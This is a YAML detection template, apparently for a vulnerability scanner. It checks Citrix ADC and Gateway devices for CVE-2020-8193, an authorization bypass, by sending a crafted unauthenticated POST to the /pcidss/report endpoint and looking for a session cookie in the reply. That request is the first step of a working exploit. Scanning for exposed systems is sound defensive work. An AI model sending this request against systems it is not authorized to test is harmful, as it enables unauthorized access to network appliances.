app: Citrix
query: body:"citrix"
meta:
  name: Citrix CVE-2020-8193 Unauthorized
  level: 4
  tags:
    - remote_code_execution
  description: CVE-2020-8193权限绕过漏洞存在于Citrix ADC，Citrix Gateway和Citrix SD-WAN WANOP产品的report模块（all_profiles函数），攻击者可通过构造未授权的数据包进行特定读取、删除文件操作，一定条件下可导致远程代码执行，从而获得主机系统root权限。
  homepage: https://www.citrix.com/
  author: 一曲成殇
  references: https://github.com/PR3R00T/CVE-2020-8193-Citrix-Scanner/blob/master/scanner.py
  solution: 升级系统版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
            redirect: true
            header:
              - Content-Type: application/xml
              - X-NITRO-USER: jr9bt
              - X-NITRO-PASS: boej3
            params: <appfwprofile><login></login></appfwprofile>
          response:
            - name: code
              value: "406"
              type: equals
            - name: header
              value: Set-Cookie
              type: contains
  create_at: "2021-11-06 15:31:06"
